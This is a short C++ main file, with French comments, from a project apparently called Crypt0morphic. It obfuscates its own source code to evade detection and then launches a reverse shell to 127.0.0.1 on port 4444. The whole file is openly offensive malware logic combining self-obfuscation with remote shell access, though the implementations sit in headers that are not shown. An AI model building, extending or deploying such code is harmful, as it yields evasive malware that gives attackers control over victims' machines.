#include <iostream>
#include <ostream>

#include "./obfuscator/obfuscator.h"
#include "./reverse_shell/reverse_shell.h"

int main() {
    std::cout << "Bienvenue dans Crypt0morphic" << std::endl;
    // chemin du fichier a obfusquer (auto obfuscation)
    std::string sourceFile = "src/main.cpp";

    // Instanciation de l'obfuscateur
    // BEGIN_FUNCTION
    Obfuscator obfuscator(sourceFile);
    // END_FUNCTION
    if (!obfuscator.obfuscate()) {
        std::cerr << "Erreur lors de l'obfuscation" << std::endl;
        return 1;
    }

    // Obfuscation reussie, execution du reverse shell
    // BEGIN_FUNCTION
    ReverseShell rs("127.0.0.1", 4444);
    // END_FUNCTION
    if (!rs.launch()) {
        std::cerr << "Erreur lors de l'execution du reverse shell" << std::endl;
        return 1;
    }

    // restore source file
    obfuscator.restoreBackup();
    return 0;
}
